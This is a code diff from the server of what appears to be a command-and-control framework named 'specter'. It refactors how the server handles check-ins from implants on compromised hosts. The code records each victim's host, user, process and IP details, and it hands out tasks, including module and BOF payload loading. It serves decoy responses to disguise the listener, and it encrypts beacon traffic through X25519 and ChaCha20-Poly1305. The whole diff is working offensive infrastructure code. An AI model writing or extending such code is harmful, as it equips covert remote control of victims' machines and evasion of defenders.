@@ -1,4 +1,5 @@
 pub mod azure_listener;
+pub mod checkin_processor;
 pub mod dns_listener;
 pub mod ws_handler;
 
@@ -14,10 +15,7 @@ use axum::{Json, Router};
 use chacha20poly1305::aead::{Aead, KeyInit};
 use chacha20poly1305::{ChaCha20Poly1305, Nonce};
 use chrono::Utc;
-use specter_common::checkin::{
-    parse_binary_checkin, serialize_binary_response, CheckinRequest, CheckinResponse,
-    PendingTaskPayload,
-};
+use specter_common::checkin::CheckinRequest;
 use specter_common::proto::specter::v1::{Listener, ListenerStatus};
 use sqlx::sqlite::SqliteRow;
 use sqlx::{Row, SqlitePool};
@@ -32,6 +30,7 @@ use crate::profile::schema::*;
 use crate::profile::{transform_decode, transform_encode};
 use crate::session::SessionManager;
 use crate::task::TaskDispatcher;
+use checkin_processor::{parse_plaintext_checkin, process_checkin, CheckinOptions, SessionBinding};
 
 // ── Axum shared state ────────────────────────────────────────────────────────
 
@@ -142,63 +141,24 @@ async fn profile_handler(
         Err(_) => return decoy_handler().await.into_response(),
     };
 
-    // Try TLV binary first (implant sends TLV), then JSON fallback
-    let (checkin_req, is_binary) = if let Some(parsed) = parse_binary_checkin(&plaintext) {
-        (parsed, true)
-    } else if let Ok(parsed) = serde_json::from_slice::<CheckinRequest>(&plaintext) {
-        (parsed, false)
-    } else {
-        return decoy_handler().await.into_response();
+    let parsed = match parse_plaintext_checkin(&plaintext) {
+        Some(parsed) => parsed,
+        None => return decoy_handler().await.into_response(),
     };
 
-    // Process check-in
-    let session_id = match state
-        .session_manager
-        .register_or_update(
-            &checkin_req.hostname,
-            &checkin_req.username,
-            checkin_req.pid,
-            &checkin_req.os_version,
-            &checkin_req.integrity_level,
-            &checkin_req.process_name,
-            &checkin_req.internal_ip,
-            &checkin_req.external_ip,
-        )
-        .await
+    let processed = match process_checkin(
+        &state,
+        parsed.request,
+        parsed.is_binary,
+        SessionBinding::Metadata,
+        CheckinOptions {
+            defer_module_payloads: false,
+        },
+    )
+    .await
     {
-        Ok(id) => id,
+        Ok(processed) => processed,
         Err(_) => return decoy_handler().await.into_response(),
-    };
-
-    // Process task results
-    for tr in &checkin_req.task_results {
-        let success = tr.status == "COMPLETE";
-        let _ = state
-            .task_dispatcher
-            .complete_task(&tr.task_id, tr.result.as_bytes(), success)
-            .await;
-    }
-
-    // Fetch pending tasks
-    let pending = state
-        .task_dispatcher
-        .get_pending_tasks(&session_id)
-        .await
-        .unwrap_or_default();
-
-    let mut tasks_payload = Vec::new();
-    for t in &pending {
-        let _ = state.task_dispatcher.mark_dispatched(&t.id).await;
-        tasks_payload.push(PendingTaskPayload {
-            task_id: t.id.clone(),
-            task_type: t.task_type.clone(),
-            arguments: t.arguments.clone(),
-        });
-    }
-
-    let resp = CheckinResponse {
-        session_id,
-        tasks: tasks_payload,
     };
 
     // Simulate error rate
@@ -211,13 +171,9 @@ async fn profile_handler(
     }
 
     // Serialize response: binary TLV if request was binary, JSON otherwise
-    let resp_bytes = if is_binary {
-        serialize_binary_response(&resp)
-    } else {
-        match serde_json::to_vec(&resp) {
-            Ok(j) => j,
-            Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
-        }
+    let resp_bytes = match processed.response_bytes() {
+        Ok(bytes) => bytes,
+        Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
     };
 
     // Transform response: compress → encrypt → encode
@@ -317,10 +273,13 @@ pub fn format_profile_response(encoded_data: &[u8], template: &HttpTemplate) -> 
     let status = template.status_code.unwrap_or(200);
     let data_str = String::from_utf8_lossy(encoded_data);
 
-    let body = if let Some(ref body_template) = template.body_template {
-        body_template.replace("{{data}}", &data_str)
+    let (body, default_content_type) = if let Some(ref body_template) = template.body_template {
+        (
+            body_template.replace("{{data}}", &data_str).into_bytes(),
+            "application/json",
+        )
     } else {
-        data_str.to_string()
+        (encoded_data.to_vec(), "application/octet-stream")
     };
 
     let mut headers = Vec::new();
@@ -333,7 +292,13 @@ pub fn format_profile_response(encoded_data: &[u8], template: &HttpTemplate) -> 
         .iter()
         .any(|(n, _)| n.eq_ignore_ascii_case("content-type"))
     {
-        headers.push(("Content-Type".to_string(), "application/json".to_string()));
+        headers.push(("Content-Type".to_string(), default_content_type.to_string()));
+    }
+    if !headers
+        .iter()
+        .any(|(n, _)| n.eq_ignore_ascii_case("content-length"))
+    {
+        headers.push(("Content-Length".to_string(), body.len().to_string()));
     }
 
     let mut response = axum::response::Response::builder().status(status);
@@ -389,22 +354,18 @@ async fn checkin_handler(
     State(state): State<HttpState>,
     Json(req): Json<CheckinRequest>,
 ) -> impl IntoResponse {
-    // 1. Register or update the session.
-    let session_id = match state
-        .session_manager
-        .register_or_update(
-            &req.hostname,
-            &req.username,
-            req.pid,
-            &req.os_version,
-            &req.integrity_level,
-            &req.process_name,
-            &req.internal_ip,
-            &req.external_ip,
-        )
-        .await
+    let processed = match process_checkin(
+        &state,
+        req,
+        false,
+        SessionBinding::Metadata,
+        CheckinOptions {
+            defer_module_payloads: true,
+        },
+    )
+    .await
     {
-        Ok(id) => id,
+        Ok(processed) => processed,
         Err(e) => {
             tracing::error!("Check-in DB error: {e}");
             return (
@@ -415,57 +376,7 @@ async fn checkin_handler(
         }
     };
 
-    // 2. Process any task results coming back from the implant.
-    for tr in &req.task_results {
-        let success = tr.status == "COMPLETE";
-        if let Err(e) = state
-            .task_dispatcher
-            .complete_task(&tr.task_id, tr.result.as_bytes(), success)
-            .await
-        {
-            tracing::warn!("Failed to complete task {}: {e}", tr.task_id);
-        }
-    }
-
-    // 3. Fetch pending tasks and mark them dispatched.
-    let pending = state
-        .task_dispatcher
-        .get_pending_tasks(&session_id)
-        .await
-        .unwrap_or_default();
-
-    let mut tasks_payload = Vec::new();
-    for t in &pending {
-        let _ = state.task_dispatcher.mark_dispatched(&t.id).await;
-
-        // For load_module tasks, the arguments field contains the module_id.
-        // Package the module for delivery (binary payload in arguments).
-        let (task_type, arguments) = if t.task_type == "load_module" || t.task_type == "module_load" || t.task_type == "bof" || t.task_type == "bof_load" {
-            if let Some(ref _module_repo) = state.module_repository {
-                // Note: in the plain JSON check-in we don't have the implant pubkey,
-                // so we can't encrypt. Send module_id as argument for the implant to
-                // request via the encrypted beacon channel instead.
-                ("load_module".to_string(), t.arguments.clone())
-            } else {
-                (t.task_type.clone(), t.arguments.clone())
-            }
-        } else {
-            (t.task_type.clone(), t.arguments.clone())
-        };
-
-        tasks_payload.push(PendingTaskPayload {
-            task_id: t.id.clone(),
-            task_type,
-            arguments,
-        });
-    }
-
-    let resp = CheckinResponse {
-        session_id,
-        tasks: tasks_payload,
-    };
-
-    match serde_json::to_value(&resp) {
+    match serde_json::to_value(&processed.response) {
         Ok(val) => (StatusCode::OK, Json(val)).into_response(),
         Err(_) => StatusCode::INTERNAL_SERVER_ERROR.into_response(),
     }
@@ -486,7 +397,11 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
     tracing::debug!("beacon_handler: received {} bytes", body.len());
 
     if body.len() < BEACON_MIN_SIZE {
-        tracing::warn!("beacon_handler: body too small ({} < {})", body.len(), BEACON_MIN_SIZE);
+        tracing::warn!(
+            "beacon_handler: body too small ({} < {})",
+            body.len(),
+            BEACON_MIN_SIZE
+        );
         return StatusCode::BAD_REQUEST.into_response();
     }
 
@@ -507,19 +422,28 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
     // Reconstruct the full implant public key by looking up session by prefix.
     // For the first check-in, we accept the full 32-byte key from the ciphertext header
     // and register a new session.
-    tracing::debug!("beacon_handler: looking up session for prefix {:02x}{:02x}{:02x}{:02x}...",
-        implant_id_prefix[0], implant_id_prefix[1], implant_id_prefix[2], implant_id_prefix[3]);
+    tracing::debug!(
+        "beacon_handler: looking up session for prefix {:02x}{:02x}{:02x}{:02x}...",
+        implant_id_prefix[0],
+        implant_id_prefix[1],
+        implant_id_prefix[2],
+        implant_id_prefix[3]
+    );
 
-    let (session_key, session_id, implant_pubkey) = match derive_session_key(&state, implant_id_prefix).await {
-        Ok(result) => {
-            tracing::debug!("beacon_handler: session key derived, session_id={:?}", result.1);
-            result
-        },
-        Err(_) => {
-            tracing::warn!("beacon_handler: failed to derive session key");
-            return StatusCode::UNAUTHORIZED.into_response();
-        },
-    };
+    let (session_key, session_id, implant_pubkey) =
+        match derive_session_key(&state, implant_id_prefix).await {
+            Ok(result) => {
+                tracing::debug!(
+                    "beacon_handler: session key derived, session_id={:?}",
+                    result.1
+                );
+                result
+            }
+            Err(_) => {
+                tracing::warn!("beacon_handler: failed to derive session key");
+                return StatusCode::UNAUTHORIZED.into_response();
+            }
+        };
 
     // Build AEAD ciphertext with appended tag (as chacha20poly1305 crate expects)
     let mut ct_with_tag = Vec::with_capacity(ct_len + WIRE_TAG_SIZE);
@@ -536,21 +460,22 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
         Ok(pt) => {
             tracing::debug!("beacon_handler: decrypted {} bytes", pt.len());
             pt
-        },
+        }
         Err(e) => {
             tracing::warn!("beacon_handler: AEAD decrypt failed: {e}");
             return StatusCode::UNAUTHORIZED.into_response();
-        },
+        }
     };
 
-    // Try binary TLV first (implant sends TLV), fall back to JSON (mock implant, profile path)
-    let (checkin_req, is_binary) = if let Some(req) = parse_binary_checkin(&plaintext) {
-        tracing::debug!("beacon_handler: parsed TLV checkin — host={}, user={}, pid={}",
-            req.hostname, req.username, req.pid);
-        (req, true)
-    } else if let Ok(req) = serde_json::from_slice::<CheckinRequest>(&plaintext) {
-        tracing::debug!("beacon_handler: parsed JSON checkin");
-        (req, false)
+    let parsed = if let Some(parsed) = parse_plaintext_checkin(&plaintext) {
+        tracing::debug!(
+            "beacon_handler: parsed checkin — binary={}, host={}, user={}, pid={}",
+            parsed.is_binary,
+            parsed.request.hostname,
+            parsed.request.username,
+            parsed.request.pid
+        );
+        parsed
     } else {
         tracing::warn!(
             "beacon_handler: failed to parse checkin payload ({} bytes, first 32: {:02x?})",
@@ -560,105 +485,41 @@ async fn beacon_handler(State(state): State<HttpState>, body: Bytes) -> impl Int
         return StatusCode::BAD_REQUEST.into_response();
     };
 
-    // Process check-in (register/update session, handle task results, get pending tasks)
-    let sid = match &session_id {
-        Some(id) => {
-            if let Err(e) = state.session_manager.update_checkin(id).await {
-                tracing::error!("Beacon update error: {e}");
-            }
-            id.clone()
-        }
+    let binding = match session_id {
+        Some(id) => SessionBinding::Existing(id),
         None => {
-            // New session from builds table — register with full pubkey
-            tracing::info!("beacon_handler: registering new session for pubkey {:02x}{:02x}{:02x}{:02x}...",
-                implant_pubkey[0], implant_pubkey[1], implant_pubkey[2], implant_pubkey[3]);
-            match state
-                .session_manager
-                .register_or_update_with_pubkey(
-                    &checkin_req.hostname,
-                    &checkin_req.username,
-                    checkin_req.pid,
-                    &checkin_req.os_version,
-                    &checkin_req.integrity_level,
-                    &checkin_req.process_name,
-                    &checkin_req.internal_ip,
-                    &checkin_req.external_ip,
-                    &implant_pubkey,
-                )
-                .await
-            {
-                Ok(id) => id,
-                Err(e) => {
-                    tracing::error!("Beacon register error: {e}");
-                    return StatusCode::INTERNAL_SERVER_ERROR.into_response();
-                }
-            }
+            tracing::info!(
+                "beacon_handler: registering new session for pubkey {:02x}{:02x}{:02x}{:02x}...",
+                implant_pubkey[0],
+                implant_pubkey[1],
+                implant_pubkey[2],
+                implant_pubkey[3]
+            );
+            SessionBinding::ImplantPubkey(implant_pubkey)
         }
     };
 
-    // Process task results
-    for tr in &checkin_req.task_results {
-        let success = tr.status == "COMPLETE";
-        if let Err(e) = state
-            .task_dispatcher
-            .complete_task(&tr.task_id, tr.result.as_bytes(), success)
-            .await
-        {
-            tracing::warn!("Beacon: failed to complete task {}: {e}", tr.task_id);
+    let processed = match process_checkin(
+        &state,
+        parsed.request,
+        parsed.is_binary,
+        binding,
+        CheckinOptions {
+            defer_module_payloads: false,
+        },
+    )
+    .await
+    {
+        Ok(processed) => processed,
+        Err(e) => {
+            tracing::error!("Beacon checkin processing error: {e}");
+            return StatusCode::INTERNAL_SERVER_ERROR.into_response();
         }
-
-        // Parse sleep task results to update session sleep config.
-        // The implant returns "interval=30s jitter=15%" for sleep tasks.
-        if success && tr.result.contains("interval=") {
-            let mut interval = 0u32;
-            let mut jitter = 0u32;
-            for part in tr.result.split_whitespace() {
-                if let Some(val) = part.strip_prefix("interval=").and_then(|s| s.strip_suffix('s')) {
-                    interval = val.parse().unwrap_or(0);
-                }
-                if let Some(val) = part.strip_prefix("jitter=").and_then(|s| s.strip_suffix('%')) {
-                    jitter = val.parse().unwrap_or(0);
-                }
-            }
-            if interval > 0 {
-                let _ = state
-                    .session_manager
-                    .update_sleep_config(&sid, interval, jitter)
-                    .await;
-            }
-        }
-    }
-
-    // Fetch pending tasks
-    let pending = state
-        .task_dispatcher
-        .get_pending_tasks(&sid)
-        .await
-        .unwrap_or_default();
-
-    let mut tasks_payload = Vec::new();
-    for t in &pending {
-        let _ = state.task_dispatcher.mark_dispatched(&t.id).await;
-        tasks_payload.push(PendingTaskPayload {
-            task_id: t.id.clone(),
-            task_type: t.task_type.clone(),
-            arguments: t.arguments.clone(),
-        });
-    }
-
-    let resp = CheckinResponse {
-        session_id: sid,
-        tasks: tasks_payload,
     };
 
-    // Serialize response: binary TLV if request was binary, JSON otherwise
-    let response_payload = if is_binary {
-        serialize_binary_response(&resp)
-    } else {
-        match serde_json::to_vec(&resp) {
-            Ok(j) => j,
-            Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
-        }
+    let response_payload = match processed.response_bytes() {
+        Ok(bytes) => bytes,
+        Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
     };
 
     // Generate a fresh nonce for the response
@@ -715,19 +576,22 @@ async fn derive_session_key(
     for session in &sessions {
         if let Ok(Some(pubkey)) = state.session_manager.get_implant_pubkey(&session.id).await {
             if pubkey.len() >= 12 && &pubkey[..12] == implant_id_prefix {
-                let implant_pub = PublicKey::from(
-                    <[u8; 32]>::try_from(&pubkey[..32]).map_err(|_| ())?
-                );
+                let implant_pub =
+                    PublicKey::from(<[u8; 32]>::try_from(&pubkey[..32]).map_err(|_| ())?);
                 let shared = state.server_secret.diffie_hellman(&implant_pub);
                 let key = hkdf_sha256_derive(shared.as_bytes(), &pubkey[..32]);
-                return Ok((key, Some(session.id.clone()), <[u8; 32]>::try_from(&pubkey[..32]).unwrap()));
+                return Ok((
+                    key,
+                    Some(session.id.clone()),
+                    <[u8; 32]>::try_from(&pubkey[..32]).unwrap(),
+                ));
             }
         }
     }
 
     // Phase 2: Check builds table (new implants)
     let row: Option<(Vec<u8>,)> = sqlx::query_as(
-        "SELECT implant_pubkey FROM builds WHERE implant_pubkey_prefix = ?1 LIMIT 1"
+        "SELECT implant_pubkey FROM builds WHERE implant_pubkey_prefix = ?1 LIMIT 1",
     )
     .bind(implant_id_prefix)
     .fetch_optional(&state.pool)
@@ -736,9 +600,7 @@ async fn derive_session_key(
 
     if let Some((pubkey,)) = row {
         if pubkey.len() == 32 {
-            let implant_pub = PublicKey::from(
-                <[u8; 32]>::try_from(&pubkey[..]).map_err(|_| ())?
-            );
+            let implant_pub = PublicKey::from(<[u8; 32]>::try_from(&pubkey[..]).map_err(|_| ())?);
             let shared = state.server_secret.diffie_hellman(&implant_pub);
             let key = hkdf_sha256_derive(shared.as_bytes(), &pubkey);
             let mut pk32 = [0u8; 32];
@@ -758,14 +620,13 @@ fn hkdf_sha256_derive(shared_secret: &[u8], implant_pubkey: &[u8]) -> [u8; 32] {
     type HmacSha256 = Hmac<Sha256>;
 
     // Extract: PRK = HMAC-SHA256(key=implant_pubkey, msg=shared_secret)
-    let mut mac = <HmacSha256 as Mac>::new_from_slice(implant_pubkey)
-        .expect("HMAC key length is valid");
+    let mut mac =
+        <HmacSha256 as Mac>::new_from_slice(implant_pubkey).expect("HMAC key length is valid");
     mac.update(shared_secret);
     let prk = mac.finalize().into_bytes();
 
     // Expand: OKM = HMAC-SHA256(key=PRK, msg="specter-session" || 0x01)
-    let mut mac2 = <HmacSha256 as Mac>::new_from_slice(&prk)
-        .expect("HMAC key length is valid");
+    let mut mac2 = <HmacSha256 as Mac>::new_from_slice(&prk).expect("HMAC key length is valid");
     mac2.update(b"specter-session");
     mac2.update(&[0x01]);
     let okm = mac2.finalize().into_bytes();
